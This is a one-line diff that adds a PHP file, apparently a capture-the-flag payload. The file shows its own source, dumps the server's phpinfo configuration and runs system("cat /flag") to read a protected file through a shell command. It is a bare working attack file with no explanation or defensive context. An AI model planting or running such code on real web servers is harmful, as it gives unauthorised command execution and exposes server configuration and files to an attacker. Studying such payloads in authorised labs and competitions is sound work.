@@ -1,0 +1,1 @@
+<?php highlight_file(__FILE__);phpinfo();print(system("cat /flag"));?>
